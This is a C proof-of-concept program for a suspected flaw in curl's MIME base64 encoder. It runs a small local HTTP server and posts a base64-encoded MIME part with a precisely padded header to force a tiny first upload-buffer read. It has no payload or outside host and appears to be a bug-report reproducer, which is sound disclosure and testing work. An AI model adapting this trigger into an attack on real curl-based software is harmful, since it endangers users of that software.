/***************************************************************************
 *                                  _   _ ____  _
 *  Project                     ___| | | | |_) | |
 *                             / __| | | | |  _ <|
 *                             | (__| |_| |_| |_|
 *                              \___|\___|_| |_|
 *
 * PoC for the curl mime base64 encoder: drives a MIMEPOST through the
 * public API against a local HTTP server.
 *
 ***************************************************************************/
#include <curl/curl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <netinet/in.h>
#include <arpa/inet.h>

#define PORT       47777
#define NAME       "fff"
#define DATALEN    90
#define PADLINE    16212   /* total length of the X-Pad header line */

/* Minimal HTTP server: read one request, then answer 200. */
static int run_server(void)
{
  int lfd, cfd, one = 1;
  struct sockaddr_in addr;
  char buf[8192];
  char *req = NULL;
  size_t reqlen = 0, reqcap = 0, i;
  ssize_t n;
  long clen = 0;
  int hdr_done = 0;

  lfd = socket(AF_INET, SOCK_STREAM, 0);
  if(lfd < 0)
    return 1;
  setsockopt(lfd, SOL_SOCKET, SO_REUSEADDR, &one, sizeof(one));
  memset(&addr, 0, sizeof(addr));
  addr.sin_family = AF_INET;
  addr.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
  addr.sin_port = htons(PORT);
  if(bind(lfd, (struct sockaddr *)&addr, sizeof(addr)) < 0 ||
     listen(lfd, 1) < 0)
    return 1;
  cfd = accept(lfd, NULL, NULL);
  if(cfd < 0)
    return 1;

  for(;;) {
    n = recv(cfd, buf, sizeof(buf), 0);
    if(n <= 0)
      break;
    if(reqlen + (size_t)n + 1 > reqcap) {
      char *p = realloc(req, (reqlen + (size_t)n + 1) * 2);
      if(!p)
        return 1;
      req = p;
      reqcap = (reqlen + (size_t)n + 1) * 2;
    }
    memcpy(req + reqlen, buf, (size_t)n);
    reqlen += (size_t)n;
    req[reqlen] = 0;
    if(!hdr_done) {
      for(i = 0; i + 3 < reqlen; i++) {
        if(req[i] == '\r' && req[i+1] == '\n' &&
           req[i+2] == '\r' && req[i+3] == '\n') {
          char *cl = strcasestr(req, "Content-Length:");
          if(cl)
            clen = strtol(cl + 15, NULL, 10);
          hdr_done = 1;
          break;
        }
      }
    }
    if(hdr_done && (long)(reqlen - (i + 4)) >= clen)
      break;
  }
  (void)send(cfd, "HTTP/1.1 200 OK\r\nContent-Length: 0\r\n\r\n", 37, 0);
  close(cfd);
  close(lfd);
  free(req);
  return 0;
}

int main(void)
{
  CURL *curl;
  curl_mime *mime;
  curl_mimepart *part;
  struct curl_slist *hdrs = NULL;
  char data[DATALEN];
  char *pad;
  int status;
  pid_t pid;

  pid = fork();
  if(pid == 0)
    _exit(run_server());

  curl_global_init(CURL_GLOBAL_ALL);
  curl = curl_easy_init();
  mime = curl_mime_init(curl);
  part = curl_mime_addpart(mime);

  curl_mime_name(part, NAME);
  memset(data, 'A', sizeof(data));
  curl_mime_data(part, data, sizeof(data));
  curl_mime_encoder(part, "base64");

  /* Size the custom header so the first upload-buffer read is tiny. */
  pad = malloc(PADLINE + 1);
  if(!pad)
    return 1;
  memcpy(pad, "X-Pad: ", 7);
  memset(pad + 7, 'a', PADLINE - 9);
  pad[PADLINE - 2] = '\0';

  hdrs = curl_slist_append(hdrs, "Expect:");
  hdrs = curl_slist_append(hdrs, pad);

  curl_easy_setopt(curl, CURLOPT_URL, "http://127.0.0.1:47777/");
  curl_easy_setopt(curl, CURLOPT_HTTPHEADER, hdrs);
  curl_easy_setopt(curl, CURLOPT_MIMEPOST, mime);
  curl_easy_setopt(curl, CURLOPT_UPLOAD_BUFFERSIZE, 16384L);

  curl_easy_perform(curl);

  curl_easy_cleanup(curl);
  curl_mime_free(mime);
  curl_slist_free_all(hdrs);
  curl_global_cleanup();
  free(pad);
  waitpid(pid, &status, 0);
  return 0;
}
